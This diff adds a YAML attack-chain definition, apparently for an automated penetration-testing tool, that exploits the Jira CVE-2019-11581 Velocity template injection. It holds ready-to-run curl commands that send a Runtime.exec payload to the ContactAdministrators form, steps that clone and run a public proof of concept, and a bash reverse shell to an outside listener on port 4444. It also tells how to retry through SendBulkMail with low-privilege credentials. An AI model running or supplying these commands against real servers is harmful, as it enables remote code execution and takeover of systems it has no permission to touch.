@@ -1,0 +1,59 @@
+chain_id: jira_ssti_cve_2019_11581
+title: "Atlassian Jira — CVE-2019-11581 SSTI in ContactAdministrators → RCE"
+severity: HIGH
+tags: [web, jira, atlassian, cve-2019-11581, ssti, velocity, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2019-11581" }
+    - { banner_pattern: "(?i)atlassian\\s*jira|jira(\\s|/)" }
+    - { product_pattern: "(?i)jira" }
+    - { path_pattern: "(?i)/secure/(ContactAdministrators|SendBulkMail)!default\\.jspa" }
+
+description: |
+  Jira Server / Data Center 4.4.0 → 7.6.13, 7.7.0 → 7.13.4,
+  8.0.0 → 8.0.3, 8.1.0 → 8.1.1, 8.2.0 → 8.2.2 ship a Velocity-
+  templated `ContactAdministrators` form that interpolates the
+  attacker-supplied `subject`/`body` parameters. If the contact form
+  is enabled (and SMTP configured), pre-auth RCE via Velocity. SMTP
+  not configured but logged-in user → still works via `SendBulkMail`.
+
+steps:
+  - id: 1
+    title: "Probe — 200 + form HTML means form is enabled"
+    command: |
+      curl -sk "http://$VICTIMA/secure/ContactAdministrators!default.jspa" -I
+      curl -sk "http://$VICTIMA/secure/ContactAdministrators.jspa" | grep -i 'subject\\|body'
+
+  - id: 2
+    title: "Send the Velocity payload"
+    command: |
+      curl -sk "http://$VICTIMA/secure/ContactAdministrators.jspa" \
+        --data-urlencode "atl_token=" \
+        --data-urlencode "from=rootctl@evil.com" \
+        --data-urlencode "subject=rootctl" \
+        --data-urlencode "details=\$i18n.getClass().forName('java.lang.Runtime').getMethod('exec',\"\".getClass()).invoke(\$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null),'id')" \
+        --data 'Send=Send'
+
+  - id: 3
+    title: "Public PoC (handles the form-token for you)"
+    command: |
+      git clone https://github.com/jas502n/CVE-2019-11581 /tmp/jira
+      python3 /tmp/jira/CVE-2019-11581.py http://$VICTIMA 'id'
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      python3 /tmp/jira/CVE-2019-11581.py http://$VICTIMA \
+        'bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
+
+common_errors:
+  - error: "ContactAdministrators returns 401"
+    solution: |
+      Form requires login on this build. Use `SendBulkMail!default.jspa`
+      with admin creds (or any low-priv user in some builds — try both).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2019-11581
+  - https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
